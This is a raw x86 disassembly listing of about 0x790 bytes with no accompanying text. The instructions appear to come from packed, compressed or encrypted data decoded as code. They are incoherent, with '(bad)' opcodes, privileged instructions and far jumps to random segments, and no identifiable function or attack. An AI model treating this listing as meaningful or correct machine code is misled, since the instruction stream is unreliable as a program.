  40882f:	mov    al,ds:0x4697279f
  408834:	and    DWORD PTR [eax+eiz*4],0xfffffff9
  408838:	dec    ebp
  408839:	dec    esp
  40883a:	test   DWORD PTR fs:[esp+edi*2-0x54],eax
  40883f:	clc    
  408840:	fist   DWORD PTR ds:0x4b81de30
  408846:	inc    ecx
  408847:	iret   
  408848:	rcl    esi,cl
  40884a:	adc    dh,cl
  40884c:	and    eax,0xea06f9d3
  408851:	mov    eax,ds:0x3756ba20
  408856:	(bad)  
  408857:	and    al,0x6
  408859:	pop    edx
  40885a:	cs sbb al,0x19
  40885d:	sbb    eax,0x6183a46c
  408862:	jmp    0x9dc72593
  408867:	loopne 0x408835
  408869:	fsqrt  
  40886b:	jmp    0xf6285fc7
  408870:	in     al,dx
  408871:	ss jle 0x40881e
  408874:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408875:	ficom  WORD PTR [ebx+0x5f]
  408878:	mov    bh,0xa9
  40887a:	pop    ecx
  40887b:	ds pop eax
  40887d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40887e:	cmp    BYTE PTR ds:0x6f94b8b,dh
  408884:	std    
  408885:	and    edx,0xcbae7716
  40888b:	sub    DWORD PTR [esi],0xffffff8f
  40888e:	cmp    dl,bl
  408890:	bound  esp,QWORD PTR [eax-0x1e]
  408893:	dec    ebp
  408894:	cmp    ah,BYTE PTR [edx-0x66ad4f1b]
  40889a:	xor    al,0xe
  40889c:	ss fchs 
  40889f:	into   
  4088a0:	jbe    0x40884c
  4088a2:	sbb    ah,cl
  4088a4:	xchg   edi,eax
  4088a5:	sbb    DWORD PTR [eax-0x692e54fc],esi
  4088ab:	inc    ebx
  4088ac:	cvtps2pd xmm5,QWORD PTR [ebx]
  4088af:	dec    esp
  4088b0:	lahf   
  4088b1:	dec    esp
  4088b2:	inc    ebx
  4088b3:	xor    bl,ch
  4088b5:	hlt    
  4088b6:	shr    BYTE PTR [ebp+0x196c54f3],cl
  4088bc:	mov    ah,0x77
  4088be:	icebp  
  4088bf:	push   esp
  4088c0:	inc    ecx
  4088c1:	hlt    
  4088c2:	fcomp  QWORD PTR ds:0xf627d36d
  4088c8:	rcl    bl,0x9a
  4088cb:	icebp  
  4088cc:	dec    ebp
  4088cd:	outs   dx,DWORD PTR ds:[esi]
  4088ce:	rol    DWORD PTR [edi],cl
  4088d0:	sar    DWORD PTR [edx],cl
  4088d2:	shl    BYTE PTR [ecx+0x58f37706],1
  4088d8:	jns    0x408895
  4088da:	(bad)  
  4088db:	ror    BYTE PTR [edx],0xb8
  4088de:	sti    
  4088df:	fwait
  4088e0:	dec    esi
  4088e1:	mov    al,ds:0xe5a11d57
  4088e6:	push   cs
  4088e7:	pushf  
  4088e8:	mov    ch,BYTE PTR [ebp-0x22dae211]
  4088ee:	jg     0x408883
  4088f0:	std    
  4088f1:	and    eax,0x134ec390
  4088f6:	push   esi
  4088f7:	ins    DWORD PTR es:[edi],dx
  4088f8:	(bad)  
  4088f9:	mov    WORD PTR [ebp-0x55],ss
  4088fc:	lods   eax,DWORD PTR ds:[esi]
  4088fd:	add    al,0xf0
  4088ff:	dec    esi
  408900:	adc    BYTE PTR [ecx],al
  408902:	das    
  408903:	cmp    eax,0x33cf0cb1
  408908:	sub    al,0xde
  40890a:	jno    0x408953
  40890c:	dec    eax
  40890d:	sbb    BYTE PTR [ecx-0x77],ah
  408910:	pushf  
  408911:	cdq    
  408912:	ret    
  408913:	in     eax,0x85
  408915:	xchg   esi,eax
  408916:	fdivr  DWORD PTR [ebx-0xed4b361]
  40891c:	stc    
  40891d:	aaa    
  40891e:	add    al,0xf3
  408920:	mov    ecx,0x7438be42
  408925:	pop    esp
  408926:	shl    eax,0xb2
  408929:	jl     0x408946
  40892b:	sbb    esi,edx
  40892d:	sbb    DWORD PTR [esp+ebx*8+0x39],ebp
  408931:	mov    ch,0x17
  408933:	hlt    
  408934:	mov    ch,0x63
  408936:	cmp    BYTE PTR [ebp+0x66f2c15],0xab
  40893d:	pop    ecx
  40893e:	fnsave [esi+eax*4+0x3d4f5c9a]
  408945:	jmp    0x4088fd
  408947:	jbe    0x4089a0
  408949:	dec    eax
  40894a:	mov    ebx,0xfc71bc24
  40894f:	retf   
  408950:	pop    ds
  408951:	pop    ebp
  408952:	dec    edx
  408953:	mov    al,ds:0x7a3e6553
  408958:	mov    bl,0xf2
  40895a:	mov    ebx,0xcbca3d01
  40895f:	pop    eax
  408960:	into   
  408961:	setle  BYTE PTR [esi-0x63e15c6c]
  408968:	popf   
  408969:	hlt    
  40896a:	stos   BYTE PTR es:[edi],al
  40896b:	jno    0x4089ca
  40896d:	retf   
  40896e:	ret    
  40896f:	mov    WORD PTR [ebx-0x602d4830],ds
  408975:	sbb    ch,BYTE PTR [ebx]
  408977:	pop    ss
  408978:	xor    al,0xc3
  40897a:	nop
  40897b:	push   es
  40897c:	cdq    
  40897d:	pop    es
  40897e:	test   eax,0xebaf37cc
  408983:	push   cs
  408984:	pop    ds
  408985:	sahf   
  408986:	dec    esp
  408987:	ror    esi,1
  408989:	scas   al,BYTE PTR es:[edi]
  40898a:	stc    
  40898b:	int    0x79
  40898d:	in     al,dx
  40898e:	xlat   BYTE PTR ds:[ebx]
  40898f:	ja     0x170ee26c
  408995:	jecxz  0x408926
  408997:	(bad)  [edi-0x17e78de1]
  40899d:	pop    esi
  40899e:	mov    bl,BYTE PTR [eax]
  4089a0:	pushf  
  4089a1:	or     BYTE PTR [esi],0xb8
  4089a4:	jg     0x408973
  4089a6:	loopne 0x408936
  4089a8:	fild   DWORD PTR [esi+0x2f7e6b0]
  4089ae:	lods   eax,DWORD PTR ds:[esi]
  4089af:	dec    eax
  4089b0:	not    BYTE PTR [edi-0x7b]
  4089b3:	sbb    edx,ebp
  4089b5:	out    dx,al
  4089b6:	imul   ebp,DWORD PTR [esi],0x7a49557f
  4089bc:	push   cs
  4089bd:	cmc    
  4089be:	out    0x37,eax
  4089c0:	lds    eax,FWORD PTR [ebp+0x67249ff2]
  4089c6:	dec    ecx
  4089c7:	mov    edx,0xf2b28bb3
  4089cc:	and    esi,DWORD PTR [esi]
  4089ce:	(bad)  
  4089cf:	mov    bl,0x1d
  4089d1:	mov    ebp,0x89ba2ecf
  4089d6:	mov    BYTE PTR [ebx-0x22],cl
  4089d9:	push   ecx
  4089da:	dec    ebp
  4089db:	nop
  4089dc:	jno    0x4089ab
  4089de:	fdiv   QWORD PTR [ebx+ecx*8+0x6e]
  4089e2:	push   cs
  4089e3:	or     al,0x50
  4089e5:	rol    BYTE PTR [edi-0x247ddff],1
  4089eb:	les    edi,FWORD PTR [edx+0x1e]
  4089ee:	dec    esp
  4089ef:	sahf   
  4089f0:	add    dh,BYTE PTR [esp+ebp*8-0x69]
  4089f4:	jp     0x408a50
  4089f6:	clc    
  4089f7:	sbb    ebx,eax
  4089f9:	aaa    
  4089fa:	cmp    ebx,DWORD PTR [edx-0x29]
  4089fd:	mov    dh,0x57
  4089ff:	adc    al,0x5c
  408a01:	dec    edi
  408a02:	push   ds
  408a03:	loope  0x408994
  408a05:	xchg   esp,eax
  408a06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a07:	and    ebp,DWORD PTR [ebx+esi*2-0x52]
  408a0b:	pushf  
  408a0c:	and    BYTE PTR [eax],bh
  408a0e:	fstp   QWORD PTR [edi+0x55]
  408a11:	arpl   dx,si
  408a13:	push   cs
  408a14:	push   esp
  408a15:	int    0xf4
  408a17:	mov    al,0x20
  408a19:	sub    eax,0x4a90f439
  408a1e:	mov    edx,0x39b0dc69
  408a23:	push   ecx
  408a24:	pop    edi
  408a25:	es sub esi,edi
  408a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a29:	inc    ecx
  408a2a:	cwde   
  408a2b:	mov    ss,ecx
  408a2d:	aaa    
  408a2e:	retf   0x7091
  408a31:	in     eax,0xaf
  408a33:	icebp  
  408a34:	call   0xc102d56a
  408a39:	stos   DWORD PTR es:[edi],eax
  408a3a:	push   eax
  408a3b:	adc    BYTE PTR [ebp-0x64],0x4e
  408a3f:	retf   0x3e57
  408a42:	cld    
  408a43:	inc    edx
  408a44:	icebp  
  408a45:	pop    esi
  408a46:	test   esp,edx
  408a48:	loope  0x408a6d
  408a4a:	mov    esi,0x429c0411
  408a4f:	ret    
  408a50:	test   al,0x20
  408a52:	ret    
  408a53:	rol    BYTE PTR [edx+0x3b],cl
  408a56:	js     0x408aaf
  408a58:	push   0xc5dfc249
  408a5d:	push   0x64c33d4f
  408a62:	leave  
  408a63:	and    DWORD PTR [ebx-0x1491c5f5],esi
  408a69:	xor    DWORD PTR [esi+ebx*4],ebx
  408a6c:	ins    DWORD PTR es:[edi],dx
  408a6d:	jmp    0x58e3:0x7a70ee82
  408a74:	hlt    
  408a75:	test   DWORD PTR [ecx],ebp
  408a77:	mov    ah,0x71
  408a79:	xchg   esi,eax
  408a7a:	outs   dx,BYTE PTR ds:[esi]
  408a7b:	push   esi
  408a7c:	pop    ss
  408a7d:	mov    bl,0xab
  408a7f:	fbld   TBYTE PTR [edi+0x56]
  408a82:	ins    BYTE PTR es:[edi],dx
  408a83:	scas   eax,DWORD PTR es:[edi]
  408a84:	inc    edx
  408a85:	pop    ss
  408a86:	pop    ebx
  408a87:	mov    esi,0x5314b1ab
  408a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a8d:	imul   edx,DWORD PTR [esp+ebp*1-0x76592c2d],0xffffffae
  408a95:	clc    
  408a96:	push   cs
  408a97:	retf   0x1df0
  408a9a:	mov    bh,0x28
  408a9c:	imul   edx,eax,0x5157ff49
  408aa2:	test   DWORD PTR [di+0x25],esp
  408aa6:	mov    ds:0x63fda834,eax
  408aab:	mov    ah,0x17
  408aad:	dec    ebx
  408aae:	popa   
  408aaf:	cmp    DWORD PTR [edx],0xd
  408ab2:	and    DWORD PTR [eax-0x1c],ebx
  408ab5:	push   esp
  408ab6:	pop    es
  408ab7:	into   
  408ab8:	scas   al,BYTE PTR es:[edi]
  408ab9:	(bad)  
  408aba:	and    bh,BYTE PTR [eax-0x7e]
  408abd:	ror    DWORD PTR [ebx],cl
  408abf:	in     eax,0x84
  408ac1:	stos   DWORD PTR es:[edi],eax
  408ac2:	cmp    al,0x27
  408ac4:	xchg   DWORD PTR [esi],ecx
  408ac6:	adc    eax,0xa1dd3216
  408acb:	fld    QWORD PTR [esi-0x34791069]
  408ad1:	retf   
  408ad2:	adc    DWORD PTR [ecx-0x231390cf],edx
  408ad8:	mov    esi,0xc3a9e3ff
  408add:	inc    ecx
  408ade:	test   eax,0x13c537b5
  408ae3:	addr16 loopne 0x408ae3
  408ae6:	movq   mm6,QWORD PTR ds:0x3c78d47f
  408aed:	nop
  408aee:	xchg   edi,eax
  408aef:	stc    
  408af0:	and    al,0xe5
  408af2:	clc    
  408af3:	xor    eax,DWORD PTR [esi]
  408af5:	jbe    0x408b32
  408af7:	dec    edi
  408af8:	jae    0x408abc
  408afa:	cmp    eax,esp
  408afc:	fwait
  408afd:	repz sbb DWORD PTR [edi+eiz*4+0x5e],edi
  408b02:	sar    BYTE PTR [eax],1
  408b04:	rcr    BYTE PTR [esi-0x78],cl
  408b07:	dec    eax
  408b08:	ins    BYTE PTR es:[edi],dx
  408b09:	icebp  
  408b0a:	mov    edx,0x24ea64ae
  408b0f:	lods   al,BYTE PTR ds:[si]
  408b11:	nop
  408b12:	jp     0x408ad9
  408b14:	dec    eax
  408b15:	ficomp DWORD PTR [edi+0x25]
  408b18:	repnz loop 0x408ac9
  408b1b:	dec    eax
  408b1c:	xchg   ebp,eax
  408b1d:	lahf   
  408b1e:	das    
  408b1f:	mov    ?,WORD PTR [ebx+0xa]
  408b22:	cmc    
  408b23:	es xchg edx,eax
  408b25:	sahf   
  408b26:	and    bh,ch
  408b28:	mov    ecx,0xa9b12515
  408b2d:	in     al,dx
  408b2e:	fimul  WORD PTR [esi]
  408b30:	rcr    BYTE PTR [esi-0x667de898],0xbc
  408b37:	push   edx
  408b38:	or     bh,BYTE PTR [esi]
  408b3a:	sbb    al,0x6e
  408b3c:	mul    dh
  408b3e:	js     0x408b97
  408b40:	adc    DWORD PTR [ebx-0x32],ebp
  408b43:	add    bh,bh
  408b45:	mov    edx,0x7120e01c
  408b4a:	pop    esi
  408b4b:	fld    DWORD PTR [ebx+0x7]
  408b4e:	mov    BYTE PTR [esi],bh
  408b50:	sbb    DWORD PTR [edi],ecx
  408b52:	enter  0xd194,0xbe
  408b56:	leave  
  408b57:	lahf   
  408b58:	sbb    DWORD PTR [edx-0x3b],esp
  408b5b:	add    DWORD PTR [eax-0x59],esp
  408b5e:	dec    edi
  408b5f:	cmp    ch,BYTE PTR [eax+0x2365bf53]
  408b65:	sub    al,0x76
  408b67:	jle    0x408b3d
  408b69:	dec    eax
  408b6a:	and    BYTE PTR ss:[ecx],al
  408b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b6e:	mov    es,WORD PTR [ebp-0x232503b3]
  408b74:	scas   al,BYTE PTR es:[edi]
  408b75:	adc    cl,BYTE PTR [edx]
  408b77:	cdq    
  408b78:	es icebp 
  408b7a:	ja     0x408bb5
  408b7c:	lds    ebx,FWORD PTR [eax+eiz*8]
  408b7f:	cdq    
  408b80:	nop
  408b81:	mov    ds:0x39417f71,eax
  408b86:	mov    dh,0x59
  408b88:	nop
  408b89:	fsub   DWORD PTR [edi+0x7d]
  408b8c:	push   ebp
  408b8d:	aam    0x4e
  408b8f:	ss jnp 0x408b78
  408b92:	xchg   DWORD PTR [edi],eax
  408b94:	addr16 push ss
  408b96:	sbb    esp,DWORD PTR gs:[esi-0x6139b673]
  408b9d:	iret   
  408b9e:	jmp    0x15f5455a
  408ba3:	jne    0x408be2
  408ba5:	jno    0x408be1
  408ba7:	and    BYTE PTR [esi+0x28dfbcd9],dl
  408bad:	fisttp QWORD PTR [edi+0x6c1c011e]
  408bb3:	vshufps xmm2,xmm5,XMMWORD PTR [bx+si-0x33],0x79
  408bba:	xor    eax,0xc962b5f7
  408bbf:	scas   eax,DWORD PTR es:[edi]
  408bc0:	or     eax,0xd9c6d30d
  408bc5:	push   ds
  408bc6:	mov    ebp,0xd88e33d7
  408bcb:	ss jmp 0x304a:0x383d3d9a
  408bd3:	inc    BYTE PTR cs:[edi+0x5c78ca75]
  408bda:	(bad)  
  408bdb:	ror    BYTE PTR [ebx-0x60],cl
  408bde:	xchg   DWORD PTR [ecx+edx*1],esp
  408be1:	push   esp
  408be2:	fcom   QWORD PTR [edi]
  408be4:	(bad)  
  408be5:	(bad)  
  408be6:	mov    esi,0xd8cfb3c5
  408beb:	adc    BYTE PTR [eax],dl
  408bed:	add    ecx,DWORD PTR [eax]
  408bef:	ret    0x89e3
  408bf2:	scas   eax,DWORD PTR es:[edi]
  408bf3:	rcl    DWORD PTR [ebx-0x16],0x3
  408bf7:	(bad)  
  408bf8:	jmp    0x6ac4362e
  408bfd:	stos   DWORD PTR es:[edi],eax
  408bfe:	fsub   DWORD PTR [edi+edx*2+0x0]
  408c02:	or     BYTE PTR [ecx],0x60
  408c05:	in     al,dx
  408c06:	xor    eax,0x559ace5e
  408c0b:	test   DWORD PTR [edi-0x77],eax
  408c0e:	mov    al,ds:0x798c739d
  408c13:	mov    ecx,0xa5432471
  408c18:	xlat   BYTE PTR ds:[ebx]
  408c19:	pop    ebp
  408c1a:	out    dx,al
  408c1b:	aaa    
  408c1c:	ffree  st(7)
  408c1e:	inc    ebx
  408c1f:	add    bl,BYTE PTR [ebx]
  408c21:	adc    esp,eax
  408c23:	les    esi,FWORD PTR [ebp-0x4c]
  408c26:	not    DWORD PTR [esi+0x51]
  408c29:	sbb    cl,al
  408c2b:	fsub   QWORD PTR [edx+ebp*1+0x6a]
  408c2f:	and    BYTE PTR [ecx+0x1a3d4bdb],dh
  408c35:	shl    BYTE PTR [ecx],0x57
  408c38:	aad    0x3e
  408c3a:	lods   al,BYTE PTR ds:[esi]
  408c3b:	ret    0x853c
  408c3e:	test   BYTE PTR [edi+0x6b],dh
  408c41:	mov    cl,0xda
  408c43:	clc    
  408c44:	mov    esp,0x71950c05
  408c49:	push   ebp
  408c4a:	mov    DWORD PTR [edx+0x38],ebp
  408c4d:	pop    edi
  408c4e:	jo     0x408c25
  408c50:	dec    eax
  408c51:	jae    0x408c67
  408c53:	inc    sp
  408c55:	jp     0x408cbf
  408c57:	ja     0x408be1
  408c59:	cdq    
  408c5a:	pop    esp
  408c5b:	aam    0x0
  408c5d:	jns    0x408c7b
  408c5f:	push   edx
  408c60:	mov    ch,0xf6
  408c62:	jecxz  0x408bfd
  408c64:	jmp    0x290d:0x10e28015
  408c6b:	inc    eax
  408c6c:	cmp    BYTE PTR [ecx+0x18],cl
  408c6f:	pop    ss
  408c70:	sbb    eax,0x30074759
  408c75:	imul   esp,eax,0xffffffb0
  408c78:	jno    0x408c3a
  408c7a:	jnp    0x408c3d
  408c7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c7d:	push   esp
  408c7e:	mov    ch,0xf
  408c80:	mov    al,0x59
  408c82:	fnstsw WORD PTR [ecx-0x2a99fb32]
  408c88:	mov    ah,BYTE PTR [esi+0x748ff641]
  408c8e:	ss jecxz 0x408c68
  408c91:	shr    DWORD PTR [ebx+0xba8941e],cl
  408c97:	pop    esp
  408c98:	ret    0x5c51
  408c9b:	sbb    cl,BYTE PTR [edx-0x6a]
  408c9e:	pop    ds
  408c9f:	pop    ebp
  408ca0:	jbe    0x408c60
  408ca2:	xchg   esp,eax
  408ca3:	sbb    ecx,DWORD PTR [eax-0x1faa0538]
  408ca9:	sbb    eax,DWORD PTR [edi]
  408cab:	ss int 0x83
  408cae:	pop    edi
  408caf:	(bad)  
  408cb0:	xor    DWORD PTR ds:0xf24bf81e,esi
  408cb6:	mov    esi,0x4bec923e
  408cbb:	xor    eax,0xa63b50f5
  408cc0:	dec    edx
  408cc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cc2:	sahf   
  408cc3:	push   ebx
  408cc4:	push   edi
  408cc5:	pop    ecx
  408cc6:	xor    al,dl
  408cc8:	or     esp,eax
  408cca:	jg     0x408c6d
  408ccc:	push   eax
  408ccd:	lahf   
  408cce:	cmp    eax,0x5339bcf9
  408cd3:	mov    dh,0x27
  408cd5:	stos   DWORD PTR es:[edi],eax
  408cd6:	jo     0x408d21
  408cd8:	xor    BYTE PTR [ebp-0x41],0x81
  408cdc:	sub    ebp,esi
  408cde:	and    eax,0x3b8c2171
  408ce3:	stos   BYTE PTR es:[edi],al
  408ce4:	mov    bh,0xa3
  408ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ce7:	pop    ebx
  408ce8:	scas   eax,DWORD PTR es:[edi]
  408ce9:	jns    0x408d40
  408ceb:	or     al,0x62
  408ced:	dec    eax
  408cee:	pop    ebx
  408cef:	xchg   dl,dh
  408cf1:	nop
  408cf2:	jmp    0xb1d:0x5809b4fc
  408cf9:	out    0x7f,eax
  408cfb:	scas   eax,DWORD PTR es:[edi]
  408cfc:	std    
  408cfd:	out    0xf9,eax
  408cff:	(bad)  
  408d00:	xchg   esp,eax
  408d01:	jmp    0x408d1d
  408d03:	and    bl,al
  408d05:	scas   al,BYTE PTR es:[edi]
  408d06:	ja     0x408d07
  408d08:	ror    BYTE PTR [ecx+0x5fb7b39d],0x1f
  408d0f:	pop    esp
  408d10:	sub    esi,DWORD PTR [edx+0x60]
  408d13:	add    eax,0x95f1c6f0
  408d18:	push   ss
  408d19:	or     ebx,DWORD PTR [ecx+edi*2]
  408d1c:	jmp    0x248b:0xf9b82d52
  408d23:	fdiv   DWORD PTR gs:[edx+0x18]
  408d27:	dec    edi
  408d28:	ja     0x408d28
  408d2a:	aam    0xf9
  408d2c:	ds jge 0x408d7b
  408d2f:	sbb    DWORD PTR [edi+edi*8+0x11],ebx
  408d33:	data16 mov ah,cl
  408d36:	inc    esp
  408d37:	mov    dh,0xc1
  408d39:	dec    ebx
  408d3a:	stc    
  408d3b:	cli    
  408d3c:	sahf   
  408d3d:	stos   DWORD PTR es:[edi],eax
  408d3e:	jp     0x408d47
  408d40:	aaa    
  408d41:	fs xor cl,BYTE PTR ds:[ebp-0x26]
  408d46:	push   eax
  408d47:	adc    bl,BYTE PTR ds:0x28878135
  408d4d:	cwde   
  408d4e:	push   ds
  408d4f:	cmp    bh,BYTE PTR [ebx]
  408d51:	jnp    0x408d8b
  408d53:	mov    esp,0x8a85acc2
  408d58:	arpl   WORD PTR [edx+0x114869f2],dx
  408d5e:	test   ah,al
  408d60:	pop    esi
  408d61:	xchg   esi,eax
  408d62:	call   0xdf2e:0xcbd8995
  408d69:	jmp    0x7c4d:0x87a08dff
  408d70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d71:	and    cl,ah
  408d73:	xor    ah,BYTE PTR [esi+0x73]
  408d76:	loopne 0x408d82
  408d78:	push   cs
  408d79:	mov    ds:0xb46134a0,al
  408d7e:	ja     0x408d87
  408d80:	cmp    ebx,DWORD PTR [ebx+0x4dc2fd2a]
  408d86:	xchg   ebp,eax
  408d87:	push   ebx
  408d88:	inc    ebx
  408d89:	or     al,0xb2
  408d8b:	aaa    
  408d8c:	idiv   dl
  408d8e:	pusha  
  408d8f:	(bad)  
  408d90:	call   0x9aa1:0x8ca9b348
  408d97:	push   esp
  408d98:	enter  0x51c1,0x5f
  408d9c:	mov    ?,WORD PTR [ecx]
  408d9e:	sbb    eax,0x6b55b870
  408da3:	add    ch,BYTE PTR [eax+edi*1+0x70477011]
  408daa:	xor    BYTE PTR [esp+ecx*8],0x27
  408dae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408daf:	push   esp
  408db0:	(bad)  
  408db1:	mov    dh,0x72
  408db3:	mov    bl,0xd7
  408db5:	nop
  408db6:	out    0x92,eax
  408db8:	cdq    
  408db9:	jmp    0x408d76
  408dbb:	push   edx
  408dbc:	adc    ebp,DWORD PTR cs:[ebx-0x53]
  408dc0:	test   DWORD PTR [esi+0x1d],esp
  408dc3:	stos   BYTE PTR es:[edi],al
  408dc4:	mov    WORD PTR [edi-0x1956054a],ss
  408dca:	scas   al,BYTE PTR es:[edi]
  408dcb:	sahf   
  408dcc:	into   
  408dcd:	xchg   esp,eax
  408dce:	add    al,0x8a
  408dd0:	test   esi,ebx
  408dd2:	mov    BYTE PTR ds:0x7e6adb7e,al
  408dd8:	mov    dh,0xaf
  408dda:	mov    al,0xb3
  408ddc:	mov    ds:0xcf4ca1aa,eax
  408de1:	xor    eax,0x206f6c03
  408de6:	xchg   esi,eax
  408de7:	or     bl,BYTE PTR [esi]
  408de9:	xchg   esi,eax
  408dea:	cwde   
  408deb:	add    ebx,edi
  408ded:	sahf   
  408dee:	or     BYTE PTR [eax+0x3a3aa574],ch
  408df4:	outs   dx,BYTE PTR ds:[esi]
  408df5:	repnz div DWORD PTR [ebp+0x299b28a1]
  408dfc:	pop    ds
  408dfd:	retf   
  408dfe:	outs   dx,BYTE PTR ds:[esi]
  408dff:	sub    eax,0x1df370df
  408e04:	push   0x20
  408e06:	pushf  
  408e07:	mov    eax,0xc224eac7
  408e0c:	sbb    eax,0xdc83e5ed
  408e11:	jae    0x408e54
  408e13:	cwde   
  408e14:	push   0x43
  408e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e17:	call   DWORD PTR [edi+0x62]
  408e1a:	out    0x94,al
  408e1c:	pop    es
  408e1d:	pop    edx
  408e1e:	outs   dx,DWORD PTR ds:[esi]
  408e1f:	(bad)  
  408e20:	cmc    
  408e21:	xor    BYTE PTR [ebx],0x5a
  408e24:	imul   DWORD PTR [edi-0x7672e3b]
  408e2a:	ins    DWORD PTR es:[edi],dx
  408e2b:	shl    BYTE PTR [eax+0x16212d46],1
  408e31:	inc    edx
  408e32:	not    DWORD PTR [edx]
  408e34:	popa   
  408e35:	adc    DWORD PTR [edi-0xb509422],ebx
  408e3b:	std    
  408e3c:	and    DWORD PTR [ecx],0x1d
  408e3f:	rcr    DWORD PTR [esi+0x2c805b3c],1
  408e45:	xchg   BYTE PTR [edx+eax*2],ch
  408e48:	in     al,0x14
  408e4a:	call   0xe955:0xf9b0efea
  408e51:	push   ss
  408e52:	sub    al,0x5d
  408e54:	scas   al,BYTE PTR es:[edi]
  408e55:	fadd   QWORD PTR fs:[esi-0x2e096605]
  408e5c:	sbb    al,0x21
  408e5e:	popa   
  408e5f:	mov    dh,0xef
  408e61:	repnz fnstsw WORD PTR [ecx+0xf750316]
  408e68:	cmp    dl,dl
  408e6a:	jbe    0x408e30
  408e6c:	shl    BYTE PTR [esi-0x43],0x19
  408e70:	pop    ds
  408e71:	mov    bl,0x90
  408e73:	out    0x4e,al
  408e75:	push   ecx
  408e76:	push   ecx
  408e77:	mov    dh,0x35
  408e79:	mov    esp,0x210dc30f
  408e7e:	dec    ecx
  408e7f:	ja     0x408e29
  408e81:	mov    ds:0x4e09f3b4,eax
  408e86:	pop    ebp
  408e87:	cmp    DWORD PTR gs:[eax+0x74],edi
  408e8b:	sbb    BYTE PTR [edi+0x758a4a5e],dh
  408e91:	cmp    ah,dl
  408e93:	fistp  QWORD PTR [ebx]
  408e95:	sub    BYTE PTR [edi],dh
  408e97:	inc    edi
  408e98:	fiadd  DWORD PTR [ebp-0x5c]
  408e9b:	and    eax,0x124b1f7b
  408ea0:	sbb    DWORD PTR [edi+0x5bc7fa85],ebp
  408ea6:	cs loope 0x408eb6
  408ea9:	lahf   
  408eaa:	sahf   
  408eab:	mov    dh,0xfa
  408ead:	xor    al,BYTE PTR [eax+0x5da2864a]
  408eb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eb4:	fwait
  408eb5:	pop    esp
  408eb6:	sbb    eax,0xc352a7cd
  408ebb:	xchg   DWORD PTR [edx+0x69],edx
  408ebe:	bound  esp,QWORD PTR [ebx+ecx*8-0x7b317e6b]
  408ec5:	push   edi
  408ec6:	into   
  408ec7:	js     0x408eb2
  408ec9:	mov    dh,0xed
  408ecb:	hlt    
  408ecc:	enter  0xfcce,0x23
  408ed0:	xor    al,0x34
  408ed2:	aad    0x9f
  408ed4:	jp     0x408ec3
  408ed6:	shl    BYTE PTR [edx-0x73],1
  408ed9:	loope  0x408ef9
  408edb:	dec    esp
  408edc:	inc    ebp
  408edd:	or     al,0x12
  408edf:	in     al,dx
  408ee0:	pop    esp
  408ee1:	add    BYTE PTR [ecx],0xc
  408ee4:	ins    BYTE PTR es:[edi],dx
  408ee5:	mov    esp,ebp
  408ee7:	dec    ecx
  408ee8:	mov    bl,bh
  408eea:	mov    ebp,0x59f177c4
  408eef:	sbb    al,bh
  408ef1:	arpl   WORD PTR [ebx-0x4c],di
  408ef4:	jle    0x408f0d
  408ef6:	loopne 0x408f57
  408ef8:	shl    BYTE PTR [esi+0xe8e56f9],1
  408efe:	popa   
  408eff:	hlt    
  408f00:	ds mov ebp,0x747fa184
  408f06:	cdq    
  408f07:	cs push ss
  408f09:	dec    edx
  408f0a:	sub    edi,edi
  408f0c:	nop
  408f0d:	lods   al,BYTE PTR ds:[esi]
  408f0e:	jl     0x408f88
  408f10:	xor    dh,BYTE PTR [edx-0x4f]
  408f13:	add    eax,0x2fea7254
  408f18:	retf   
  408f19:	jae    0x408f20
  408f1b:	pop    ecx
  408f1c:	push   0xc88ae9b3
  408f21:	or     esp,DWORD PTR [edx-0x66]
  408f24:	sbb    bl,BYTE PTR [ebx-0x15]
  408f27:	fwait
  408f28:	repz pusha 
  408f2a:	mov    esi,DWORD PTR [esp+esi*1+0x2647ef06]
  408f31:	adc    al,0x90
  408f33:	(bad)  
  408f34:	adc    eax,0xd3e3e515
  408f39:	bound  eax,QWORD PTR [ebp+0x68]
  408f3c:	push   esi
  408f3d:	fldcw  WORD PTR [ebx+0x156df30d]
  408f43:	push   esp
  408f44:	test   BYTE PTR [ebx+0x3d],cl
  408f47:	mov    edx,0x4f01e665
  408f4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f4d:	mov    al,0xfa
  408f4f:	add    ebx,0xbca87b7f
  408f55:	mov    dh,0x60
  408f57:	cdq    
  408f58:	or     ebx,edi
  408f5a:	jge    0x408f84
  408f5c:	imul   edx,DWORD PTR ds:0xd2e0e755,0xffffff93
  408f63:	adc    BYTE PTR [edx+ecx*2+0x66bf3311],0xf4
  408f6b:	jb     0x408f00
  408f6d:	mov    ecx,0x2588c200
  408f72:	push   edx
  408f73:	pop    esi
  408f74:	add    bl,ch
  408f76:	dec    esp
  408f77:	sub    DWORD PTR [eax+0x1e77b2cc],ebx
  408f7d:	xor    esi,edx
  408f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f80:	lahf   
  408f81:	xor    eax,0x57cd6cba
  408f86:	dec    edx
  408f87:	pop    esi
  408f88:	add    ecx,esp
  408f8a:	push   0x5c
  408f8c:	push   edx
  408f8d:	fistp  DWORD PTR [ecx+0x1a]
  408f90:	aas    
  408f91:	pop    ss
  408f92:	mov    al,0xd7
  408f94:	jmp    FWORD PTR [eax-0x2f]
  408f97:	neg    BYTE PTR [edx+ebp*2+0x45]
  408f9b:	adc    al,0x3
  408f9d:	mov    ds:0xf17ed540,al
  408fa2:	(bad)  
  408fa3:	stc    
  408fa4:	mov    ah,0xf
  408fa7:	imul   eax,DWORD PTR [edi-0x42],0x9c5c1d09
  408fae:	mov    ch,0xf8
  408fb0:	pop    edi
  408fb1:	or     BYTE PTR [esi+ebp*2-0xa3cead],bl
  408fb8:	inc    esi
  408fb9:	scas   al,BYTE PTR es:[edi]
  408fba:	fxch   st(4)
